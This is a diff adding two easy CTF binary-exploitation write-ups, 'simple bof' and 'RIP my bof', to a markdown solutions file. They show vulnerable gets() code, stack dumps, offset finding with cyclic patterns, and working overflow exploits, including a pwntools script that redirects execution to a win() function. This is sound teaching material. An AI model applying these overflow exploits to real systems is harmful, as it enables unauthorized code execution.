@@ -51,6 +51,8 @@
 * [Binary](#binary)
 		* [Lazy Game Challenge](#lazy-game-challenge)
 		* [Favorite Color](#favorite-color)
+	* [simple bof](#simple-bof)
+	* [RIP my bof](#rip-my-bof)
 * [Misc](#misc)
 		* [Help Bity](#help-bity)
 		* [Rock Paper Scissors](#rock-paper-scissors)
@@ -892,6 +894,188 @@ So the payload can be `52A + \x57\x86\x04\x08`.
 
 `(python -c 'print(52 * "A" + "\x57\x86\x04\x08")' ;cat) | ./color `
 
+### simple bof
+
+*easy*
+
+
+```c
+  int notsecret = 0xffffff00;
+  int secret = 0xdeadbeef;
+
+  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
+  memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding.
+
+  // Initializes the stack visualization. Don't worry about it!
+  init_visualize(buff);
+
+  // Prints out the stack before modification
+  visualize(buff);
+
+  printf("Input some text: ");
+  gets(buff); // This is a vulnerable call!
+
+  // Prints out the stack after modification
+  visualize(buff);
+
+  // Check if secret has changed.
+  if (secret == 0x67616c66) {
+    puts("You did it! Congratuations!");
+    print_flag(); // Print out the flag. You deserve it.
+    return;
+  } else if (notsecret != 0xffffff00) {
+    puts("Uhmm... maybe you overflowed too much. Try deleting a few characters.");
+  } else if (secret != 0xdeadbeef) {
+    puts("Wow you overflowed the secret value! Now try controlling the value of it!");
+  } else {
+    puts("Maybe you haven't overflowed enough characters? Try again?");
+  }
+
+  exit(0);
+}
+```
+We should overflow to turn `0xdeadbeef` in to `0x67616c66`-> `flag`
+```
+nc thekidofarcrania.com 35235
+
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED CORRECT secret
+0xffda5ef8 | 00 00 00 00 00 00 00 00 |
+0xffda5f00 | 00 00 00 00 00 00 00 00 |
+0xffda5f08 | 00 00 00 00 00 00 00 00 |
+0xffda5f10 | 00 00 00 00 00 00 00 00 |
+0xffda5f18 | ff ff ff ff ff ff ff ff |
+0xffda5f20 | ff ff ff ff ff ff ff ff |
+0xffda5f28 | ef be ad de 00 ff ff ff |
+0xffda5f30 | c0 85 71 f7 84 7f 5d 56 |
+0xffda5f38 | 48 5f da ff 11 5b 5d 56 |
+0xffda5f40 | 60 5f da ff 00 00 00 00 |
+
+Input some text: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED CORRECT secret
+0xffda5ef8 | 61 61 61 61 62 61 61 61 |
+0xffda5f00 | 63 61 61 61 64 61 61 61 |
+0xffda5f08 | 65 61 61 61 66 61 61 61 |
+0xffda5f10 | 67 61 61 61 68 61 61 61 |
+0xffda5f18 | 69 61 61 61 6a 61 61 61 |
+0xffda5f20 | 6b 61 61 61 6c 61 61 61 |
+0xffda5f28 | 6d 61 61 61 6e 61 61 61 |
+0xffda5f30 | 6f 61 61 61 70 61 61 61 |
+0xffda5f38 | 71 61 61 61 72 61 61 61 |
+0xffda5f40 | 73 61 61 61 74 61 61 61 |
+
+Uhmm... maybe you overflowed too much. Try deleting a few characters.
+```
+The addr of secret is `0xffda5f28`, the 4 bytes after our first try of overflow is `0x6161616d`
+
+```python
+>>> p32(0x6161616d)
+b'maaa'
+>>> cyclic_find("maaa")
+48
+```
+
+So exp 
+
+```python
+print("A"*48 + "flag")
+```
+
+### RIP my bof
+
+*easy*
+
+```c
+void win() {
+  system("/bin/cat /flag.txt");
+}
+
+void vuln() {
+  char padding[16];
+  char buff[32];
+
+  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
+  memset(padding, 0xFF, sizeof(padding)); // Mark the padding with 0xff.
+
+  // Initializes the stack visualization. Don't worry about it!
+  init_visualize(buff);
+
+  // Prints out the stack before modification
+  visualize(buff);
+
+  printf("Input some text: ");
+  gets(buff); // This is a vulnerable call!
+
+  // Prints out the stack after modification
+  visualize(buff);
+}
+```
+
+Use buff to make stackoverflow and cover RA as the addr of `system("/bin/cat /flag.txt")`->`win()`
+Use gdb to debug sever, the ELF file.
+
+```
+>> info functions
+0x08048586  win
+```
+
+```bash
+./server
+
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED
+  return address MODIFIED
+0xff8e2be0 | 00 00 00 00 00 00 00 00 |
+0xff8e2be8 | 00 00 00 00 00 00 00 00 |
+0xff8e2bf0 | 00 00 00 00 00 00 00 00 |
+0xff8e2bf8 | 00 00 00 00 00 00 00 00 |
+0xff8e2c00 | ff ff ff ff ff ff ff ff |
+0xff8e2c08 | ff ff ff ff ff ff ff ff |
+0xff8e2c10 | c0 65 f1 f7 00 a0 04 08 |
+0xff8e2c18 | 28 2c 8e ff 8b 86 04 08 |
+Return address: 0x0804868b
+
+Input some text: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED
+  return address MODIFIED
+0xff8e2be0 | 61 61 61 61 62 61 61 61 |
+0xff8e2be8 | 63 61 61 61 64 61 61 61 |
+0xff8e2bf0 | 65 61 61 61 66 61 61 61 |
+0xff8e2bf8 | 67 61 61 61 68 61 61 61 |
+0xff8e2c00 | 69 61 61 61 6a 61 61 61 |
+0xff8e2c08 | 6b 61 61 61 6c 61 61 61 |
+0xff8e2c10 | 6d 61 61 61 6e 61 61 61 |
+0xff8e2c18 | 6f 61 61 61 70 61 61 61 |
+Return address: 0x61616170
+
+段错误 (核心已转储)
+```
+
+RA: `0x61616170`, which is invalid.
+
+```python
+>>> p32(0x61616170)
+b'paaa'
+>>> cyclic_find("paaa")
+60
+```
+
+exp
+
+```python
+from pwn import *
+
+process = remote("thekidofarcrania.com", 4902)
+process.recv()
+
+process.sendline(b"\41"*60 + p32(0x08048586))
+
+process.interactive()
+```
 
 ## Misc
 
